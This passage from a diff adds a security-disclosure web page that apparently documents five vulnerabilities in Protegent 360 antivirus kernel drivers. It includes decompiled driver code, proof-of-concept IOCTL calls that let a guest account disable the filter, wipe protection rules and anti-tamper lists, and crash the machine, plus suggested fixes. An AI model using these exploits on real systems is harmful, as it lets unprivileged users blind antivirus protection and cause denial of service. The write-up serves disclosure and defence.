+        5,         // file_overwrite_if (create or truncate)
+        0x60,      // file_non_directory_file | file_synchronous_io_nonalert
+        NULL, 0);
+
+    if (arg3 != 0)
+        ZwWriteFile(handle, 0, 0, 0, &amp;ioStatus, arg2, arg3, 0, 0);
+
+    ZwClose(handle);
+}</pre>
+          </div>
+
+          <p>
+            The call chain: <strong>unprivileged guest user</strong> -> <code>DeviceIoControl</code> -> <strong>kernel IOCTL handler</strong> -> <code>ZwWriteFile</code> to <code>C:\Windows\system32\</code>. The security product designed to protect your files is the mechanism by which your files get overwritten.
+          </p>
+
+          <h3>Exploitation</h3>
+          <p>Disabling the entire security filter is one IOCTL:</p>
+          <div class="code-block">
+            <div class="code-block-label">proof of concept</div>
+            <pre>
+HANDLE h = CreateFileA("\\\\.\\BE79F7D853E643089D51EDCDA79805C4",
+                       GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
+
+DWORD val = 0;
+DeviceIoControl(h, 0x9C40241C, &amp;val, sizeof(val), NULL, 0, &amp;ret, NULL);
+// filter disabled, persisted to st1.dat, stays dead across reboots</pre>
+          </div>
+
+          <p>Clearing all the rules is equally trivial:</p>
+          <div class="code-block">
+            <div class="code-block-label">proof of concept</div>
+            <pre>
+DWORD dummy = 0;
+DeviceIoControl(h, 0x9C402400, &amp;dummy, sizeof(dummy), NULL, 0, &amp;ret, NULL);
+// netrdbsr.dat truncated from 25,620 bytes to 4 bytes
+
+DeviceIoControl(h, 0x9C402408, &amp;dummy, sizeof(dummy), NULL, 0, &amp;ret, NULL);
+// netrdbsp.dat truncated from 3,476 bytes to 4 bytes</pre>
+          </div>
+
+          <h3>Results</h3>
+          <p>Every single IOCTL worked from a <strong>non-administrator user</strong>:</p>
+          <table class="vuln-table">
+            <thead><tr><th>IOCTL</th><th>Action</th><th>Result</th></tr></thead>
+            <tbody>
+              <tr><td><code>0x9C40241C</code></td><td>Disable filter (enabled=0)</td><td>SUCCESS, filter disabled, persisted to st1.dat</td></tr>
+              <tr><td><code>0x9C402420</code></td><td>Query enabled state</td><td>SUCCESS, returned 0 (disabled)</td></tr>
+              <tr><td><code>0x9C402418</code></td><td>Read version</td><td>SUCCESS, returned 0x0A</td></tr>
+              <tr><td><code>0x9C402424</code></td><td>Self-whitelist PID</td><td>SUCCESS, minifilter PreCreate bypassed</td></tr>
+              <tr><td><code>0x9C402400</code></td><td>Clear path rules</td><td>SUCCESS, netrdbsr.dat: 25,620 &rarr; 4 bytes</td></tr>
+              <tr><td><code>0x9C402408</code></td><td>Clear volume rules</td><td>SUCCESS, netrdbsp.dat: 3,476 &rarr; 4 bytes</td></tr>
+              <tr><td><code>0x9C402404</code></td><td>Flush rule list 1</td><td>SUCCESS, netrdbst1.dat created</td></tr>
+              <tr><td><code>0x9C40240C</code></td><td>Flush rule list 2</td><td>SUCCESS</td></tr>
+            </tbody>
+          </table>
+          <p>
+            Every row is a guest account doing things only SYSTEM should be able to do. Every row is a "security" product making the system less secure than if it wasn't installed.
+          </p>
+        </section>
+
+        <hr class="section-divider">
+
+        <section class="article-section" id="cve2">
+          <h2>BSOD as a Service (Secure Folders Edition)</h2>
+          <p><strong><a href="https://cwe.mitre.org/data/definitions/476.html" style="color:var(--accent);text-decoration:underline">CWE-476</a>  - NULL Pointer Dereference</strong></p>
+
+          <h3>The Problem</h3>
+          <p>
+            Both serialization functions in the Secure Folders driver, <code>sub_13828</code> (path rules) and <code>sub_138fc</code> (volume rules), call <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-exallocatepoolwithtag" style="color:var(--accent-alt);text-decoration:underline"><code>ExAllocatePool</code></a>(NonPagedPool, size) to get a contiguous buffer for serializing the in-memory rule list. In kernel development, there is exactly one thing you are supposed to do after calling <code>ExAllocatePool</code>: <strong>check if it returned NULL</strong>. Unistal's developers chose not to do this.
+          </p>
+          <p>
+            When the allocation fails, the subsequent <code>memcpy</code> writes to address <code>0x0000000000000000</code>. Kernel page fault. Blue screen. The kind of thing that might, hypothetically, be caught by even basic code review, static analysis, or literally reading the documentation for the function you just called.
+          </p>
+
+          <div class="code-block">
+            <div class="code-block-label">decompilation, sub_13828</div>
+            <pre>
+int64_t sub_13828(int64_t* arg1, int64_t* arg2)
+{
+    FltAcquirePushLockShared(&amp;arg1[1]);
+
+    int32_t rax = arg1[2];  // count of rules in linked list
+    uint64_t rbx = (uint64_t)(rax * 0x1404);  // total buffer size
+
+    int64_t rcx_1 = *(int64_t*)arg2;
+    if (rcx_1 != 0)
+        ExFreePoolWithTag(rcx_1, 0);  // free previous buffer
+
+    if (rbx == 0) {
+        *(int64_t*)arg2 = 0;
+    } else {
+        *(int64_t*)arg2 = ExAllocatePool(0, rbx);  // no null check
+    }
+
+    arg2[1] = rbx;
+
+    if (rbx &gt; 0) {
+        int64_t* rbx_1 = *(int64_t*)arg1;
+        void* rsi_1 = NULL;
+
+        while (/* walk linked list */) {
+            // if ExAllocatePool returned null, this writes to address 0x0:
+            sub_148c0(rsi_1 + *(int64_t*)arg2, rdx_1, 0x1404);  // memcpy
+            rsi_1 += 0x1404;
+        }
+    }
+
+    FltReleasePushLock(&amp;arg1[1]);
+}</pre>
+          </div>
+
+          <p>Volume serialization (<code>sub_138fc</code>) is the same thing with <code>0xD94</code> instead of <code>0x1404</code>. They copy-pasted the bug.</p>
+
+          <h3>Making ExAllocatePool Fail</h3>
+          <p>
+            Here's where it gets interesting. You can't just load a ton of rules and hope the serialization alloc fails; the I/O manager frees the SystemBuffer from the loading IOCTL right before you trigger serialization, creating a perfectly-sized hole for the serialization buffer to land in. I tested this: 500,000 path rules (~2.4GB of individual kernel allocs) followed by serialization succeeded every time. The pool allocator happily reused the freed hole.
+          </p>
+          <p>
+            The trick is to <strong>fill the hole</strong> before serialization runs. The exploit uses concurrent threads:
+          </p>
+          <ul>
+            <li><strong>Phase 1  - Load path rules:</strong> Send N rules via IOCTL <code>0x9C402400</code>. The driver allocates <code>N * 0x1410</code> bytes in small individual pools (these succeed). When the IOCTL returns, the SystemBuffer (<code>N * 0x1404</code> bytes) is freed, leaving a big contiguous hole.</li>
+            <li><strong>Phase 2  - Pin the hole:</strong> Spawn threads that each open a separate device handle and send massive volume rule buffers via IOCTL <code>0x9C402408</code>. The I/O manager allocates a SystemBuffer for each of these IOCTLs <em>before</em> dispatching them, and doesn't free them until the driver finishes processing. While the driver is busy parsing hundreds of thousands of volume rule entries, the SystemBuffers sit there occupying the hole.</li>
+            <li><strong>Phase 3  - Pull the trigger:</strong> With the hole occupied, call IOCTL <code>0x9C402404</code>. The serialization function tries to allocate <code>N * 0x1404</code> bytes contiguous. The hole is full. <code>ExAllocatePool</code> returns NULL. The driver writes to address zero. BSOD.</li>
+          </ul>
+
+          <div class="note-box">
+            This works because path rules and volume rules use <strong>different push locks</strong> (<code>context+0x38</code> vs <code>context+0x50</code>), so the volume loading and path serialization can run concurrently without deadlocking.
+          </div>
+
+          <p>The exploit auto-scales to the target's RAM:</p>
+          <div class="code-block">
+            <div class="code-block-label">auto-scaling</div>
+            <pre>
+MEMORYSTATUSEX meminfo;
+meminfo.dwLength = sizeof(meminfo);
+GlobalMemoryStatusEx(&amp;meminfo);
+ULONGLONG total_ram = meminfo.ullTotalPhys;
+
+DWORD path_rules = (DWORD)((total_ram / 4) / 0x1410);  // 25% of ram
+ULONGLONG hole_size = (ULONGLONG)path_rules * 0x1404;
+ULONGLONG filler_target = (hole_size * 6 / 5) / 3;     // 120% / 3 threads</pre>
+          </div>
+
+          <table class="vuln-table">
+            <thead><tr><th>RAM</th><th>Path Rules</th><th>Hole Size</th><th>Filler/Thread</th><th>Total Pinned</th></tr></thead>
+            <tbody>
+              <tr><td>4 GB</td><td>~168K</td><td>~821 MB</td><td>~328 MB</td><td>~984 MB</td></tr>
+              <tr><td>8 GB</td><td>~337K</td><td>~1.6 GB</td><td>~657 MB</td><td>~1.97 GB</td></tr>
+              <tr><td>16 GB</td><td>~675K</td><td>~3.3 GB</td><td>~1.3 GB</td><td>~3.9 GB</td></tr>
+              <tr><td>32 GB</td><td>~838K (cap)</td><td>~4.1 GB</td><td>~1.6 GB</td><td>~4.9 GB</td></tr>
+            </tbody>
+          </table>
+
+          <p>
+            Any unprivileged user can BSOD the machine at will. A security product that lets guest accounts crash the kernel. Outstanding work.
+          </p>
+        </section>
+
+        <hr class="section-divider">
+
+        <section class="article-section" id="cve3">
+          <h2>The Other Driver Also Forgot About Access Control</h2>
+          <p><strong><a href="https://cwe.mitre.org/data/definitions/732.html" style="color:var(--accent);text-decoration:underline">CWE-732</a>  - Incorrect Permission Assignment for Critical Resource</strong></p>
+
+          <h3>The Problem</h3>
+          <p>
+            You'd think after building one driver with zero access control, the developers might have remembered to add some to the second one. You'd be wrong.
+          </p>
+          <p>The Protegent File Filter driver's <code>IRP_MJ_CREATE</code> handler is the most minimal handler I've ever seen. Here's the entire thing:</p>
+
+          <div class="code-block">
+            <div class="code-block-label">decompilation, sub_185f0</div>
+            <pre>
+int64_t sub_185f0(int64_t arg1, void* arg2)
+{
+    *(int32_t*)(arg2 + 0x30) = 0;   // iostatus.status = status_success
+    *(int64_t*)(arg2 + 0x38) = 0;   // iostatus.information = 0
+    IofCompleteRequest(arg2, 0);
+    return 0;
+}</pre>
+          </div>
+
+          <p>
+            That's it. Set status to success, complete the IRP, go home. This function has four lines of code and zero of them involve security. It doesn't even pretend. There's no commented-out access check, no TODO, no placeholder. The concept of access control simply does not exist in this codebase.
+          </p>
+
+          <p>Through the four exposed IOCTLs, an attacker can:</p>
+          <ol>
+            <li><strong>Clear all protection rules</strong>  - empty the kernel linked list at <code>data_202a0</code>, making the <code>ObPreOperationCallback</code> match against nothing (IOCTL <code>0x9C402401</code> with count=0)</li>
+            <li><strong>Inject arbitrary rules</strong>  - add attacker-controlled 0x800-byte entries to the kernel rule list (IOCTL <code>0x9C402401</code> with count&gt;0)</li>
+            <li><strong>Clear the process protection list</strong>  - empty <code>data_202a8</code>, removing all anti-tamper entries (IOCTL <code>0x9C402405</code> with count=0)</li>
+            <li><strong>Inject process entries</strong>  - add arbitrary 8-byte values into the process protection list (IOCTL <code>0x9C402405</code> with count&gt;0)</li>
+            <li><strong>Overwrite global config</strong>  - write any DWORD to <code>data_20410</code> (IOCTL <code>0x9C402409</code>)</li>
+            <li><strong>Trigger serialize/flush</strong>  - clear all push-lock-protected entries (IOCTL <code>0x9C40240C</code>)</li>
+          </ol>
+          <p>
+            The practical impact: the <code>ObPreOperationCallback</code> registered at altitude "1107" normally strips <code>PROCESS_TERMINATE</code> and other rights from handle operations targeting protected processes. Clear the rule and process lists, and that callback becomes a no-op. The AV's anti-tamper protection, the mechanism that prevents malware from killing the AV, is disabled with two IOCTLs from a guest account.
+          </p>
+
+          <h3>The Code</h3>
+          <p>The rule loading function unconditionally frees the entire existing rule list before adding new ones:</p>
+
+          <div class="code-block">
+            <div class="code-block-label">decompilation, sub_18618</div>
+            <pre>
+int64_t sub_18618(int32_t* arg1)
+{
+    data_202b8 = arg1[0];  // field0
+    data_202bc = arg1[1];  // field1
+
+    // free all existing rules, no questions asked
+    while (data_202a0 != 0) {
+        r8_1 = data_202a0;
+        data_202a0 = *(int64_t*)r8_1;
+        ExFreePoolWithTag(&amp;r8_1[-0x100], 0);
+    }
+
+    ExAcquireResourceExclusiveLite(&amp;data_20168, 1);
+
+    if (arg1[2] &gt; 0) {  // count
+        void* rbp_1 = &amp;arg1[3];
+        int64_t rdi = 0;
+        do {
+            char* rax_3 = ExAllocatePool(0, 0x808);
+            sub_19630(rax_3, rbp_1, 0x800);
+            *(int64_t*)(rax_3 + 0x800) = data_202a0;
+            data_202a0 = &amp;rax_3[0x800];
+            rdi++;
+            rbp_1 += 0x800;
+        } while (rdi &lt; arg1[2]);
+    }
+
+    ExReleaseResourceLite(&amp;data_20168);
+}</pre>
+          </div>
+
+          <p>
+            Send <code>{0, 0, 0}</code> (12 bytes) and the entire protection list is gone. The ObCallback now protects nothing. I genuinely wonder if this was tested even once.
+          </p>
+
+          <h3>Results</h3>
+          <table class="vuln-table">
+            <thead><tr><th>IOCTL</th><th>Action</th><th>Result</th></tr></thead>
+            <tbody>
+              <tr><td><code>0x9C402401</code> (count=0)</td><td>Clear rules</td><td>SUCCESS, ObCallbacks matching disabled</td></tr>
+              <tr><td><code>0x9C402401</code> (count=1)</td><td>Inject rule</td><td>SUCCESS, crafted entry in kernel list</td></tr>
+              <tr><td><code>0x9C402405</code> (count=0)</td><td>Clear process list</td><td>SUCCESS, process protection removed</td></tr>
+              <tr><td><code>0x9C402405</code> (count=1)</td><td>Inject process entry</td><td>SUCCESS, <code>0x4141414141414141</code> in kernel list</td></tr>
+              <tr><td><code>0x9C402409</code></td><td>Set config</td><td>SUCCESS, <code>data_20410</code> overwritten</td></tr>
+              <tr><td><code>0x9C40240C</code></td><td>Flush/serialize</td><td>error 0x7A (ERROR_INSUFFICIENT_BUFFER, no port client, but the IOCTL still dispatched)</td></tr>
+            </tbody>
+          </table>
+          <p>
+            All from a non-admin user. The AV that's supposed to protect your processes from being killed can have its protection removed by the processes it's supposed to be protecting against.
+          </p>
+        </section>
+
+        <hr class="section-divider">
+
+        <section class="article-section" id="cve4">
+          <h2>BSOD as a Service (File Filter Edition)</h2>
+          <p><strong><a href="https://cwe.mitre.org/data/definitions/476.html" style="color:var(--accent);text-decoration:underline">CWE-476</a>  - NULL Pointer Dereference</strong></p>
+
+          <h3>The Problem</h3>
+          <p>
+            Remember how the Secure Folders driver doesn't check <code>ExAllocatePool</code>'s return value? The Protegent File Filter driver does the exact same thing. These drivers were almost certainly written by the same team (or person), and they apparently have a strong commitment to never learning from their mistakes.
+          </p>
+          <p>
+            The rule loading function <code>sub_18618</code> calls <code>ExAllocatePool(NonPagedPool, 0x808)</code> in a loop, once per rule entry. The loop count comes straight from the attacker-controlled input buffer. The return value is never checked.
+          </p>
+
+          <div class="code-block">
+            <div class="code-block-label">decompilation, sub_18618 (loop)</div>
+            <pre>
+do {
+    char* rax_3 = ExAllocatePool(0, 0x808);  // can return null
+
+    // immediate dereference, no check:
+    sub_19630(rax_3, rbp_1, 0x800);              // memcpy to null
+    *(int64_t*)(rax_3 + 0x800) = data_202a0;     // write to null+0x800
+    data_202a0 = &amp;rax_3[0x800];                  // store null+0x800 as list head
+
+    rdi++;
+    rbp_1 += 0x800;
+} while (rdi &lt; arg1[2]);  // arg1[2] = attacker-controlled count</pre>
+          </div>
+
+          <h3>Exploitation</h3>
+          <p>This one is laughably simple compared to the Secure Folders BSOD. No concurrent thread tricks needed. Just send a ridiculous count:</p>
+
+          <div class="code-block">
+            <div class="code-block-label">proof of concept</div>
+            <pre>
+DWORD buf[3];
+buf[0] = 0;            // field0
+buf[1] = 0;            // field1
+buf[2] = 0x7FFFFFFF;   // count, 2 billion entries
+
+DeviceIoControl(h, 0x9C402401, buf, sizeof(buf), NULL, 0, &amp;ret, NULL);
+// never returns, bsod</pre>
+          </div>
+
+          <p>
+            That's a 12-byte buffer claiming to contain 2,147,483,647 rule entries. The driver doesn't check <code>InputBufferLength</code> against the claimed count, so it just starts allocating 0x808 bytes per iteration until the pool runs dry and the next allocation returns NULL.
+          </p>
+          <p>
+            The entire exploit is three DWORDs. My PoC tool has more lines in its help text than in the actual exploit code.
+          </p>
+        </section>
+
+        <hr class="section-divider">
+
+        <section class="article-section" id="cve5">
+          <h2>Reading Memory You Don't Own</h2>
+          <p><strong><a href="https://cwe.mitre.org/data/definitions/125.html" style="color:var(--accent);text-decoration:underline">CWE-125</a>  - Out-of-Bounds Read</strong></p>
+
+          <h3>The Problem</h3>
+          <p>
+            The IOCTL dispatch function <code>sub_186f4</code> validates <code>InputBufferLength</code> with the rigor of a bouncer at an abandoned building: it checks that it's not zero. That's the bar. If your buffer is at least 1 byte long, you're in.
+          </p>
+          <p>
+            The rule loading handler <code>sub_18618</code> then reads a 12-byte header followed by <code>count * 0x800</code> bytes of entry data, but it never received the buffer length, so it has no way to bounds-check even if it wanted to (which it clearly doesn't). Send a 12-byte buffer with <code>count = 1</code>, and the driver reads 2,048 bytes past the end of your allocation into whatever kernel pool memory happens to be next door.
+          </p>
+
+          <h3>The Code</h3>
+          <div class="code-block">
+            <div class="code-block-label">decompilation, sub_186f4 (dispatch)</div>
+            <pre>
+if (rcx == 0x9C402401) {
+    if (rdx != 0)  // rdx = InputBufferLength. this is the only validation.
+        sub_18618(*(arg2 + 0x18));  // buffer pointer, no length. good luck.
+}</pre>
+          </div>
+
+          <p>The function doesn't know how big its buffer is. Nobody told it. It just reads until it's done or until it hits an unmapped page and crashes.</p>
+
+          <h3>Exploitation</h3>
+          <div class="code-block">
+            <div class="code-block-label">proof of concept</div>
+            <pre>
+DWORD buf[3];
+buf[0] = 0;  // field0
+buf[1] = 0;  // field1
+buf[2] = 1;  // count = 1, but no entry data in the buffer
+
+DeviceIoControl(h, 0x9C402401, buf, sizeof(buf),  // only 12 bytes
+                NULL, 0, &amp;ret, NULL);
+// success, driver read 0x800 bytes of adjacent pool data</pre>
+          </div>
+
+          <p>
+            The I/O manager allocates a 12-byte SystemBuffer from NonPagedPool. The driver reads the header fine, then reads 2,048 bytes starting at offset 12, 2,048 bytes past the end of the allocation. Whatever was sitting next to that 12-byte buffer in the kernel pool, other drivers' allocations, freed blocks with residual data, token structures, gets copied into a new rule entry.
+          </p>
+
+          <div class="note-box">
+            There's no IOCTL to read rule data back to user-mode, so the leaked data stays trapped in the kernel linked list. This limits the practical impact: you can't use it for KASLR bypass or direct information disclosure. But it's still a genuine out-of-bounds read that could crash the machine if it crosses a page boundary, and the leaked data could influence driver behavior if the rule matching logic processes garbage as rule content.
+          </div>
+        </section>
+
+        <hr class="section-divider">
+
+        <section class="article-section" id="recommendations">
+          <h2>How to Actually Fix This</h2>
+          <p>Since somebody has to say it:</p>
+
+          <h3>1. Add Access Control (<a href="https://cwe.mitre.org/data/definitions/732.html" style="color:var(--accent);text-decoration:underline">CWE-732</a>)</h3>
+          <p>Put a <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/sddl-for-device-objects" style="color:var(--accent-alt);text-decoration:underline">security descriptor</a> on the device object. This is the single most basic thing you can do when creating a kernel device:</p>
+          <div class="code-block">
+            <div class="code-block-label">fix</div>
+            <pre>
+UNICODE_STRING sddl = RTL_CONSTANT_STRING(
+    L"D:P(A;;GA;;;BA)(A;;GA;;;SY)");  // administrators + system only
+IoCreateDeviceSecure(DriverObject, 0, &amp;deviceName,
+    FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, FALSE,
+    &amp;sddl, NULL, &amp;deviceObject);</pre>
+          </div>
+          <p>This is literally in the <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/controlling-device-access" style="color:var(--accent-alt);text-decoration:underline">WDK documentation</a>. Under "Security." The first section.</p>
+
+          <h3>2. Check <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-exallocatepoolwithtag" style="color:var(--accent-alt);text-decoration:underline">ExAllocatePool</a> (<a href="https://cwe.mitre.org/data/definitions/476.html" style="color:var(--accent);text-decoration:underline">CWE-476</a>)</h3>
+          <div class="code-block">
+            <div class="code-block-label">fix</div>
+            <pre>
+void* buf = ExAllocatePool(NonPagedPool, size);
+if (buf == NULL) {
+    status = STATUS_INSUFFICIENT_RESOURCES;
+    goto cleanup;
+}</pre>
+          </div>
+          <p>This is taught in every introductory kernel programming resource. The function can fail. Check the return value. This shouldn't need to be said.</p>
+
+          <h3>3. Validate InputBufferLength (<a href="https://cwe.mitre.org/data/definitions/125.html" style="color:var(--accent);text-decoration:underline">CWE-125</a>)</h3>
+          <div class="code-block">
+            <div class="code-block-label">fix</div>
+            <pre>
+if (InputBufferLength &lt; 12) return STATUS_BUFFER_TOO_SMALL;
+DWORD count = ((DWORD*)SystemBuffer)[2];
+if (InputBufferLength &lt; 12 + (ULONGLONG)count * 0x800)
+    return STATUS_BUFFER_TOO_SMALL;</pre>
+          </div>
+          <p>Pass the buffer length to your handler functions. Check it before reading. Standard practice since the invention of buffers.</p>
+
+          <h3>4. Check for Integer Overflow</h3>
+          <div class="code-block">
+            <div class="code-block-label">fix</div>
+            <pre>
+if (count &gt; (MAXULONG / 0x1404)) return STATUS_INTEGER_OVERFLOW;
+SIZE_T alloc_size = (SIZE_T)count * 0x1404;</pre>
+          </div>
+          <p>Because multiplying an attacker-controlled DWORD by a constant and passing it to a memory allocator without overflow checking is exactly how you get surprise BSODs.</p>
+        </section>
+
+        <div class="note-box" style="margin-top:20px; border-color:rgba(255,20,70,0.3);">
+          Every vulnerability in this report represents a failure of basic kernel development practice. Not subtle race conditions, not complex logic errors, not edge cases in unusual configurations. Missing null checks. Missing access control. Missing buffer length validation. The kind of bugs that <a href="https://learn.microsoft.com/en-us/cpp/code-quality/understanding-sal" style="color:var(--accent-alt);text-decoration:underline">SAL annotations</a> catch, that static analysis tools flag, that code review should find in minutes. This is a commercial security product that ships kernel drivers to protect end users, and it fails to implement security fundamentals that are covered in chapter 1 of any WDK tutorial. <strong>Protegent 360</strong> is a <strong>piece of shit</strong> and no one should ever install it.
+        </div>
+
+        <div class="footer-meta">
+          <div>
+            All content provided on this page is for disclosure and education purposes only.
+          </div>
+          <div>
+            <span>Research Log</span>
+          </div>
+        </div>
+      </article>
+    </main>
+  </div>
+
+  <script>
+    const progressBar = document.getElementById("scrollProgress");
+    const toc = document.getElementById("articleToc");
+    const tocLinks = toc ? Array.from(toc.querySelectorAll("a")) : [];
+
+    function updateProgress() {
+      const scrollTop = window.scrollY || document.documentElement.scrollTop;
+      const docHeight = document.documentElement.scrollHeight - window.innerHeight;
+      const ratio = docHeight > 0 ? scrollTop / docHeight : 0;
+      const clamped = Math.max(0, Math.min(1, ratio));
+      progressBar.style.transform = "scaleX(" + clamped + ")";
+    }
+
+    function updateTocHighlight() {
+      const sections = tocLinks.map(link => {
+        const id = link.getAttribute("href").slice(1);
+        return document.getElementById(id);
+      });
+
+      let activeIndex = -1;
+      const offset = 120;
+      sections.forEach((sec, idx) => {
+        if (!sec) return;
+        const rect = sec.getBoundingClientRect();
+        if (rect.top - offset <= 0) activeIndex = idx;
+      });
+
+      tocLinks.forEach((link, idx) => {
+        if (idx === activeIndex) link.classList.add("active");
+        else link.classList.remove("active");
+      });
+    }
+
+    window.addEventListener("scroll", () => {
+      updateProgress();
+      updateTocHighlight();
+    });
+    window.addEventListener("load", () => {
+      updateProgress();
+      updateTocHighlight();
+    });
+  </script>
+</body>
+</html>
